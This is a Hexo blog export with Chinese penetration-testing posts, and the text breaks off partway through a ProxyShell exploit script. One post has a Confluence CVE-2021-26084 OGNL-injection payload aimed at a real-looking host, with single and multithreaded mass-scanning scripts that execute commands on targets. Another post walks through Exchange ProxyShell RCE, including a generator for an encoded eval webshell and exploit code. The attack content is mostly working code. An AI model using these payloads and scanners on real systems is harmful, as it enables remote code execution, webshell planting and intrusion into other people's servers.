<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PY学习-fofa导出数据添加http或https</title>
    <url>/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/</url>
    <content><![CDATA[<p>使用fofa搜索工具导出来的结果如下图，有些资产并没有http或https前缀，批量扫漏洞的时候格式不符合要求，就想着写个py添加前缀。</p>
<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908170308123.png" alt="image-20210908170308123"></p>
<p>py内容如下，大概原理就是挨个读取每一行，存在http的就跳过，443的就去掉然后添加https前缀，其他就添加http，然后重新生成添加完前缀的fofa.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3 .\fofa.py .\xxx.txt</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#open(&quot;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&quot;, &#39;w+&#39;).close()   #清空文本，没有就创建</span><br><span class="line">open(&quot;fofa.txt&quot;, &#39;w+&#39;).close()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line">    #res &#x3D; open(&#39;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    res &#x3D; open(&#39;fofa.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    try:</span><br><span class="line">        if &quot;http&quot; in hosts:</span><br><span class="line">            res.seek(0, 2)	#2代表从末尾算起，0代表偏移0个单位</span><br><span class="line">            res.write(hosts+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        elif &quot;443&quot; in hosts:</span><br><span class="line">            newre1 &#x3D; &quot;https:&#x2F;&#x2F;&quot; + hosts.replace(&quot;:443&quot;,&quot;&quot;)</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre1+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            newre&#x3D;&quot;http:&#x2F;&#x2F;&quot;+hosts</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;&#123;&#125;无法访问&quot;.format(hosts))</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    hf&#x3D;open(hostfile,&#39;r&#39;)</span><br><span class="line">    for host in hf.readlines():</span><br><span class="line">        check(host.strip(&#39;\n&#39;))</span><br><span class="line">    hf.close()</span><br></pre></td></tr></table></figure>



<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171201001.png" alt="image-20210908171201001"></p>
<p>效果</p>
<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171351024.png" alt="image-20210908171351024"></p>
<p>当然还有些重复，可以用excel的数据-删除重复项</p>
]]></content>
      <tags>
        <tag>脚本编写</tag>
      </tags>
  </entry>
  <entry>
    <title>PY学习-cve-2021-26084批量验证脚本</title>
    <url>/2021/09/08/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>先放POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x HTTP&#x2F;1.1</span><br><span class="line">Host: wiki.weiwenjia.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML like Gecko) Chrome&#x2F;44.0.2403.155 Safari&#x2F;537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID&#x3D;CDEF1127BA542DB39717A08AF71E836A</span><br><span class="line">Content-Length: 1068</span><br><span class="line"></span><br><span class="line">queryString&#x3D;aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022id%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908172352970.png" alt="image-20210908172352970"></p>
<p>单个验证脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3.exe C:&#x2F;Users&#x2F;i&#x2F;PycharmProjects&#x2F;pythonProject3&#x2F;main.py https:&#x2F;&#x2F;wiki.servoneering.com</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">urllib3.disable_warnings()	#关闭不影响执行的https错误信息</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept&#39;: &#39;*&#x2F;*&#39;,</span><br><span class="line">        &#39;Connection&#39;: &#39;close&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">requrl &#x3D; &quot;&#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x&quot;</span><br><span class="line"></span><br><span class="line">PocData &#x3D; &#123;&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin &#x3D; java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd &#x3D; new java.lang.String(\\u0022whoami\\u0022);var p &#x3D; new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022&#x2F;c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process&#x3D; p.start(); var inputStreamReader &#x3D; new java.io.InputStreamReader(process.getInputStream()); var bufferedReader &#x3D; new java.io.BufferedReader(inputStreamReader); var line &#x3D; \\u0022\\u0022; var output &#x3D; \\u0022\\u0022; while((line &#x3D; bufferedReader.readLine()) !&#x3D; null)&#123;output &#x3D; output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;	#data注意参数和数据中间用：</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line"></span><br><span class="line">    target &#x3D; hosts+requrl</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        reponse &#x3D; session.post(url&#x3D;target, headers&#x3D;header, data&#x3D;PocData, verify&#x3D;False)	#要加verify&#x3D;False，不然https的站会报错</span><br><span class="line">        soup &#x3D; BeautifulSoup(reponse.text, &#39;html.parser&#39;)</span><br><span class="line">        queryStringValue &#x3D; soup.find(&#39;input&#39;, attrs&#x3D;&#123;&#39;name&#39;: &#39;queryString&#39;, &#39;type&#39;: &#39;hidden&#39;&#125;)[&#39;value&#39;]</span><br><span class="line"></span><br><span class="line">        if queryStringValue:</span><br><span class="line">            print(&quot;存在漏洞，whoami:&#123;&#125;&quot;.format(queryStringValue))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;不存在&quot;)</span><br><span class="line">            pass</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;error&quot;)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    check(hostfile)</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908172743607.png" alt="image-20210908172743607"></p>
<p>批量验证脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#C:\Users\i\PycharmProjects\pythonProject3\venv\Scripts\python.exe C:&#x2F;Users&#x2F;i&#x2F;PycharmProjects&#x2F;pythonProject3&#x2F;main.py C:\Users\i\Desktop\CVE-2021-26084_Confluence-main\x.txt</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import threading</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">mutex &#x3D; threading.Lock()</span><br><span class="line">pool &#x3D; ThreadPoolExecutor(max_workers&#x3D;100)</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept&#39;: &#39;*&#x2F;*&#39;,</span><br><span class="line">        &#39;Connection&#39;: &#39;close&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">requrl &#x3D; &quot;&#x2F;pages&#x2F;createpage-entervariables.action?SpaceKey&#x3D;x&quot;</span><br><span class="line"></span><br><span class="line">PocData &#x3D; &#123;&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin &#x3D; java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd &#x3D; new java.lang.String(\\u0022whoami\\u0022);var p &#x3D; new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022&#x2F;c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process&#x3D; p.start(); var inputStreamReader &#x3D; new java.io.InputStreamReader(process.getInputStream()); var bufferedReader &#x3D; new java.io.BufferedReader(inputStreamReader); var line &#x3D; \\u0022\\u0022; var output &#x3D; \\u0022\\u0022; while((line &#x3D; bufferedReader.readLine()) !&#x3D; null)&#123;output &#x3D; output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line"></span><br><span class="line">    target &#x3D; hosts+requrl</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        reponse &#x3D; session.post(url&#x3D;target, headers&#x3D;header, data&#x3D;PocData, verify&#x3D;False)</span><br><span class="line">        soup &#x3D; BeautifulSoup(reponse.text, &#39;html.parser&#39;)	#这一步和下一步用来从返回包中查找指定数据</span><br><span class="line">        queryStringValue &#x3D; soup.find(&#39;input&#39;, attrs&#x3D;&#123;&#39;name&#39;: &#39;queryString&#39;, &#39;type&#39;: &#39;hidden&#39;&#125;)[&#39;value&#39;]</span><br><span class="line">        if queryStringValue:</span><br><span class="line">            if &quot;whoami&quot; in queryStringValue:</span><br><span class="line">                pass</span><br><span class="line">            elif queryStringValue:</span><br><span class="line">                print(&quot;&#123;0&#125;存在漏洞，whoami:&#123;1&#125;&quot;.format(hosts,queryStringValue))</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;&#123;&#125;不存在&quot;.format(hosts))</span><br><span class="line">                pass</span><br><span class="line">    except:</span><br><span class="line">        #print(&quot;&#123;&#125;无法访问&quot;.format(hosts))</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    hf&#x3D;open(hostfile,&#39;r&#39;)</span><br><span class="line">    for host in hf.readlines():</span><br><span class="line">        pool.submit(check,host.strip(&#39;\n&#39;))	#调用多线程传递方法和参数</span><br><span class="line">    hf.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/image-20210908173319223.png" alt="image-20210908173319223"></p>
]]></content>
      <tags>
        <tag>脚本编写</tag>
      </tags>
  </entry>
  <entry>
    <title>Exchange ProxyShell RCE漏洞</title>
    <url>/2021/08/28/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>ProxyShell是利用了Exchange服务器对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft Exchange Server 2010</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829051653850.png" alt="image-20210829051653850"></p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">生成webshell：https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;proxyshell_payload</span><br><span class="line">上传webshell：https:&#x2F;&#x2F;github.com&#x2F;dmaasland&#x2F;proxyshell-poc</span><br></pre></td></tr></table></figure>

<p>测试发现exchange的webshell貌似不能随便用，比如直接把冰蝎的aspx马放aspnet_client目录下是无法成功连接的，然后测试发现上面脚本自带的两种可以用，另外还有一个哥斯拉的生成的改一下也能用，共三种马。</p>
<h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><p>proxyshell_payload.py可以用哥斯拉CSHAP_EVAL_AES_BASE64加密方式连接，尾部webshell参数就是我们自定义webshell的地方，使用notepad++替换建议不要使用自动换行。</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829040339931.png" alt="image-20210829040339931"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#coding: UTF-8</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import six</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">DWORD_SIZE &#x3D; 4</span><br><span class="line"></span><br><span class="line">mpbbCrypt &#x3D; [</span><br><span class="line">    65, 54, 19, 98, 168, 33, 110, 187,</span><br><span class="line">    244, 22, 204, 4, 127, 100, 232, 93,</span><br><span class="line">    30, 242, 203, 42, 116, 197, 94, 53,</span><br><span class="line">    210, 149, 71, 158, 150, 45, 154, 136,</span><br><span class="line">    76, 125, 132, 63, 219, 172, 49, 182,</span><br><span class="line">    72, 95, 246, 196, 216, 57, 139, 231,</span><br><span class="line">    35, 59, 56, 142, 200, 193, 223, 37,</span><br><span class="line">    177, 32, 165, 70, 96, 78, 156, 251,</span><br><span class="line">    170, 211, 86, 81, 69, 124, 85, 0,</span><br><span class="line">    7, 201, 43, 157, 133, 155, 9, 160,</span><br><span class="line">    143, 173, 179, 15, 99, 171, 137, 75,</span><br><span class="line">    215, 167, 21, 90, 113, 102, 66, 191,</span><br><span class="line">    38, 74, 107, 152, 250, 234, 119, 83,</span><br><span class="line">    178, 112, 5, 44, 253, 89, 58, 134,</span><br><span class="line">    126, 206, 6, 235, 130, 120, 87, 199,</span><br><span class="line">    141, 67, 175, 180, 28, 212, 91, 205,</span><br><span class="line">    226, 233, 39, 79, 195, 8, 114, 128,</span><br><span class="line">    207, 176, 239, 245, 40, 109, 190, 48,</span><br><span class="line">    77, 52, 146, 213, 14, 60, 34, 50,</span><br><span class="line">    229, 228, 249, 159, 194, 209, 10, 129,</span><br><span class="line">    18, 225, 238, 145, 131, 118, 227, 151,</span><br><span class="line">    230, 97, 138, 23, 121, 164, 183, 220,</span><br><span class="line">    144, 122, 92, 140, 2, 166, 202, 105,</span><br><span class="line">    222, 80, 26, 17, 147, 185, 82, 135,</span><br><span class="line">    88, 252, 237, 29, 55, 73, 27, 106,</span><br><span class="line">    224, 41, 51, 153, 189, 108, 217, 148,</span><br><span class="line">    243, 64, 84, 111, 240, 198, 115, 184,</span><br><span class="line">    214, 62, 101, 24, 68, 31, 221, 103,</span><br><span class="line">    16, 241, 12, 25, 236, 174, 3, 161,</span><br><span class="line">    20, 123, 169, 11, 255, 248, 163, 192,</span><br><span class="line">    162, 1, 247, 46, 188, 36, 104, 117,</span><br><span class="line">    13, 254, 186, 47, 181, 208, 218, 61,</span><br><span class="line">    20, 83, 15, 86, 179, 200, 122, 156,</span><br><span class="line">    235, 101, 72, 23, 22, 21, 159, 2,</span><br><span class="line">    204, 84, 124, 131, 0, 13, 12, 11,</span><br><span class="line">    162, 98, 168, 118, 219, 217, 237, 199,</span><br><span class="line">    197, 164, 220, 172, 133, 116, 214, 208,</span><br><span class="line">    167, 155, 174, 154, 150, 113, 102, 195,</span><br><span class="line">    99, 153, 184, 221, 115, 146, 142, 132,</span><br><span class="line">    125, 165, 94, 209, 93, 147, 177, 87,</span><br><span class="line">    81, 80, 128, 137, 82, 148, 79, 78,</span><br><span class="line">    10, 107, 188, 141, 127, 110, 71, 70,</span><br><span class="line">    65, 64, 68, 1, 17, 203, 3, 63,</span><br><span class="line">    247, 244, 225, 169, 143, 60, 58, 249,</span><br><span class="line">    251, 240, 25, 48, 130, 9, 46, 201,</span><br><span class="line">    157, 160, 134, 73, 238, 111, 77, 109,</span><br><span class="line">    196, 45, 129, 52, 37, 135, 27, 136,</span><br><span class="line">    170, 252, 6, 161, 18, 56, 253, 76,</span><br><span class="line">    66, 114, 100, 19, 55, 36, 106, 117,</span><br><span class="line">    119, 67, 255, 230, 180, 75, 54, 92,</span><br><span class="line">    228, 216, 53, 61, 69, 185, 44, 236,</span><br><span class="line">    183, 49, 43, 41, 7, 104, 163, 14,</span><br><span class="line">    105, 123, 24, 158, 33, 57, 190, 40,</span><br><span class="line">    26, 91, 120, 245, 35, 202, 42, 176,</span><br><span class="line">    175, 62, 254, 4, 140, 231, 229, 152,</span><br><span class="line">    50, 149, 211, 246, 74, 232, 166, 234,</span><br><span class="line">    233, 243, 213, 47, 112, 32, 242, 31,</span><br><span class="line">    5, 103, 173, 85, 16, 206, 205, 227,</span><br><span class="line">    39, 59, 218, 186, 215, 194, 38, 212,</span><br><span class="line">    145, 29, 210, 28, 34, 51, 248, 250,</span><br><span class="line">    241, 90, 239, 207, 144, 182, 139, 181,</span><br><span class="line">    189, 192, 191, 8, 151, 30, 108, 226,</span><br><span class="line">    97, 224, 198, 193, 89, 171, 187, 88,</span><br><span class="line">    222, 95, 223, 96, 121, 126, 178, 138,</span><br><span class="line">    71, 241, 180, 230, 11, 106, 114, 72,</span><br><span class="line">    133, 78, 158, 235, 226, 248, 148, 83,</span><br><span class="line">    224, 187, 160, 2, 232, 90, 9, 171,</span><br><span class="line">    219, 227, 186, 198, 124, 195, 16, 221,</span><br><span class="line">    57, 5, 150, 48, 245, 55, 96, 130,</span><br><span class="line">    140, 201, 19, 74, 107, 29, 243, 251,</span><br><span class="line">    143, 38, 151, 202, 145, 23, 1, 196,</span><br><span class="line">    50, 45, 110, 49, 149, 255, 217, 35,</span><br><span class="line">    209, 0, 94, 121, 220, 68, 59, 26,</span><br><span class="line">    40, 197, 97, 87, 32, 144, 61, 131,</span><br><span class="line">    185, 67, 190, 103, 210, 70, 66, 118,</span><br><span class="line">    192, 109, 91, 126, 178, 15, 22, 41,</span><br><span class="line">    60, 169, 3, 84, 13, 218, 93, 223,</span><br><span class="line">    246, 183, 199, 98, 205, 141, 6, 211,</span><br><span class="line">    105, 92, 134, 214, 20, 247, 165, 102,</span><br><span class="line">    117, 172, 177, 233, 69, 33, 112, 12,</span><br><span class="line">    135, 159, 116, 164, 34, 76, 111, 191,</span><br><span class="line">    31, 86, 170, 46, 179, 120, 51, 80,</span><br><span class="line">    176, 163, 146, 188, 207, 25, 28, 167,</span><br><span class="line">    99, 203, 30, 77, 62, 75, 27, 155,</span><br><span class="line">    79, 231, 240, 238, 173, 58, 181, 89,</span><br><span class="line">    4, 234, 64, 85, 37, 81, 229, 122,</span><br><span class="line">    137, 56, 104, 82, 123, 252, 39, 174,</span><br><span class="line">    215, 189, 250, 7, 244, 204, 142, 95,</span><br><span class="line">    239, 53, 156, 132, 43, 21, 213, 119,</span><br><span class="line">    52, 73, 182, 18, 10, 127, 113, 136,</span><br><span class="line">    253, 157, 24, 65, 125, 147, 216, 88,</span><br><span class="line">    44, 206, 254, 36, 175, 222, 184, 54,</span><br><span class="line">    200, 161, 128, 166, 153, 152, 168, 47,</span><br><span class="line">    14, 129, 101, 115, 228, 194, 162, 138,</span><br><span class="line">    212, 225, 17, 208, 8, 139, 42, 242,</span><br><span class="line">    237, 154, 100, 63, 193, 108, 249, 236</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mpbbR &#x3D; mpbbCrypt</span><br><span class="line">mpbbS &#x3D; mpbbCrypt[256:]</span><br><span class="line">mpbbI &#x3D; mpbbCrypt[512:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cryptpermute(data, encrypt&#x3D;False):</span><br><span class="line">    table &#x3D; mpbbR if encrypt else mpbbI</span><br><span class="line">    tmp &#x3D; [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]</span><br><span class="line">    i &#x3D; 0</span><br><span class="line">    buf &#x3D; bytes(tmp) if six.PY3 else bytearray(tmp)</span><br><span class="line">    stream &#x3D; BytesIO(buf)</span><br><span class="line">    while True:</span><br><span class="line">        b &#x3D; stream.read(DWORD_SIZE)</span><br><span class="line">        try:</span><br><span class="line">            tmp[i] &#x3D; b[0]</span><br><span class="line">            tmp[i + 1] &#x3D; b[1]</span><br><span class="line">            tmp[i + 2] &#x3D; b[2]</span><br><span class="line">            tmp[i + 3] &#x3D; b[3]</span><br><span class="line">            i +&#x3D; DWORD_SIZE</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        if len(b) !&#x3D; DWORD_SIZE:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return bytes(tmp) if six.PY3 else &#39;&#39;.join(tmp)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    webshell &#x3D; b&quot;&lt;script language&#x3D;&#39;JScript&#39; runat&#x3D;&#39;server&#39; Page aspcompat&#x3D;true&gt;function Page_Load()&#123;eval(Request[&#39;cmd&#39;],&#39;unsafe&#39;);&#125;&lt;&#x2F;script&gt;&quot;</span><br><span class="line">    v1 &#x3D; cryptpermute(webshell, False)</span><br><span class="line">    b64_data &#x3D; base64.b64encode(v1).decode()</span><br><span class="line">    print(&quot;[+] Encode webshell ⬇\n&#123;&#125;\n&quot;.format(b64_data))</span><br><span class="line"></span><br><span class="line">    encode_shell &#x3D; base64.b64decode(b64_data)</span><br><span class="line">    decode_shell &#x3D; cryptpermute(encode_shell, True)</span><br><span class="line">    print(&quot;[+] Decode webshell ⬇\n&#123;&#125;\n&quot;.format(decode_shell.decode()))</span><br></pre></td></tr></table></figure>

<p>运行后就可以得到加密的webshell</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829035846796.png" alt="image-20210829035846796"></p>
<p>然后把这段加密的webshell替换到proxyshell_rce.py的&lt;/t:Content/&gt;字段中</p>
<p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829040606294.png" alt="image-20210829040606294"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;dmaasland&#x2F;proxyshell-poc</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import xml.etree.ElementTree as ET</span><br><span class="line"></span><br><span class="line">from pypsrp.wsman import WSMan</span><br><span class="line">from pypsrp.powershell import PowerShell, RunspacePool</span><br><span class="line">from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from socketserver import ThreadingMixIn</span><br><span class="line">from functools import partial</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):</span><br><span class="line">    &quot;&quot;&quot;Handle requests in a separate thread.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class PwnServer(BaseHTTPRequestHandler):</span><br><span class="line">    def __init__(self, proxyshell, *args, **kwargs):</span><br><span class="line">        self.proxyshell &#x3D; proxyshell</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    def do_POST(self):</span><br><span class="line">        # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">        powershell_url &#x3D; f&#39;&#x2F;powershell&#x2F;?X-Rps-CAT&#x3D;&#123;self.proxyshell.token&#125;&#39;</span><br><span class="line">        length &#x3D; int(self.headers[&#39;content-length&#39;])</span><br><span class="line">        content_type &#x3D; self.headers[&#39;content-type&#39;]</span><br><span class="line">        post_data &#x3D; self.rfile.read(length).decode()</span><br><span class="line"></span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &#39;Content-Type&#39;: content_type</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; self.proxyshell.post(</span><br><span class="line">            powershell_url,</span><br><span class="line">            post_data,</span><br><span class="line">            headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resp &#x3D; r.content</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ProxyShell:</span><br><span class="line"></span><br><span class="line">    def __init__(self, exchange_url, email, verify&#x3D;False):</span><br><span class="line"></span><br><span class="line">        self.email &#x3D; email</span><br><span class="line">        self.exchange_url &#x3D; exchange_url if exchange_url.startswith(&#39;https:&#x2F;&#x2F;&#39;) else 